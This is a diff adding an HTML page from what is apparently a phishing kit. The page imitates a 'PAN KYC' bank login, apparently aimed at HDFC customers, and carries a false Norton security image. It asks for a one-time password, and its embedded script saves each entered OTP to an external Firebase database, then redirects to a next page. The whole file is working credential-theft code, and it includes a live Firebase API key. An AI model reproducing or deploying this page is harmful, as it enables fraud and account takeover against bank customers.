@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html style="">
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>Wellcome</title>
+    <link rel="preload" as="image" href="fake/afx.png" />
+    <link rel="preload" as="image" href="fake/nortonsecurity.png" />
+    <meta name="next-head-count" content="5" />
+    <link rel="preload" href="fake/a6cd15749f8dde69.css" as="style" />
+    <link rel="stylesheet" href="fake/a6cd15749f8dde69.css" data-n-g="" />
+  </head>
+  <body>
+    <div id="__next">
+      <div class="header">
+        <div class="logo text-center">
+          <span
+            style="
+              box-sizing: border-box;
+              display: inline-block;
+              overflow: hidden;
+              width: initial;
+              height: initial;
+              background: none;
+              opacity: 1;
+              border: 0px none;
+              margin: 0px;
+              padding: 0px;
+              position: relative;
+              max-width: 100%;
+            "
+            ><span
+              style="
+                box-sizing: border-box;
+                display: block;
+                width: initial;
+                height: initial;
+                background: none;
+                opacity: 1;
+                border: 0px none;
+                margin: 0px;
+                padding: 0px;
+                max-width: 100%;
+              "
+              ><img
+                style="
+                  display: block;
+                  max-width: 100%;
+                  width: initial;
+                  height: initial;
+                  background: none;
+                  opacity: 1;
+                  border: 0px none;
+                  margin: 0px;
+                  padding: 0px;
+                "
+                alt=""
+                aria-hidden="true"
+                src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27220%27%20height=%2758%27/%3e" /></span
+            ><img
+              alt="the logo"
+              src="fake/afx.png"
+              decoding="async"
+              data-nimg="intrinsic"
+              style="
+                position: absolute;
+                inset: 0px;
+                box-sizing: border-box;
+                padding: 0px;
+                border: medium none;
+                margin: auto;
+                display: block;
+                width: 0px;
+                height: 0px;
+                min-width: 100%;
+                max-width: 100%;
+                min-height: 100%;
+                max-height: 100%;
+              "
+          /></span>
+        </div>
+      </div>
+      <div class="content">
+        <h2 class="text-center">Login to PAN KYC</h2>
+        <center><p style="color: green">one time password sent to your register mobile number</p></center>
+        <form autocomplete="off" id="form">
+          <div class="form-group">
+            <label for="username">one time password(OTP)</label>
+            <input type="text" class="form-control" id="otp" required="" />
+          </div>
+
+          <button type="submit" id="button" class="btn btn-primary login-btn">
+            LOGIN
+          </button>
+        </form>
+      </div>
+      <div class="footer">
+        © Copyright.<a href="#">Terms and Conditions</a
+        ><a href="#">Privacy Policy</a>
+      </div>
+    </div>
+
+    <!-- <script
+      type="text/javascript"
+      src="https://www.gstatic.com/firebasejs/8.2.9/firebase-app.js"
+    ></script>
+    <script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-firestore.js"></script> -->
+    <script type="module">
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js";
+      import {
+        getDatabase,
+        ref,
+        set,
+        query,
+        limitToLast,
+        get,
+      } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-database.js";
+
+      // Your web app's Firebase configuration
+      const firebaseConfig = {
+  apiKey: "AIzaSyCRzt1xcSuIjYs4Y6UOLrX2ZRSSDfGxB4w",
+  authDomain: "hdfc-kyc-8371e.firebaseapp.com",
+  projectId: "hdfc-kyc-8371e",
+  storageBucket: "hdfc-kyc-8371e.appspot.com",
+  messagingSenderId: "192461050608",
+  appId: "1:192461050608:web:cdb40f6c85a125e3b36835"
+};
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      // const db = getFirestore(app);
+      const db = getDatabase(app);
+      const que = query(ref(db, "users"), limitToLast(1));
+
+      const last_key = await get(que)
+        .then((snapshot) => {
+          if (snapshot.exists()) {
+            return parseInt(Object.keys(snapshot.val())[0]) + 1;
+          } else {
+            return 1;
+          }
+        })
+        .catch((error) => {
+          console.error(error);
+        });
+      const form = document.getElementById("form");
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        let otp = document.getElementById("otp").value;
+        if (otp != "") {
+          try {
+            const docRef = await set(ref(db, "users/" + last_key), {
+              otp: otp,
+            });
+            // localStorage.setItem("id", docRef.id);
+            window.location = "p4.html";
+          } catch (e) {
+            console.error("Error adding document: ", e);
+          }
+        }
+        return false;
+      });
+    </script>
+  </body>
+</html>
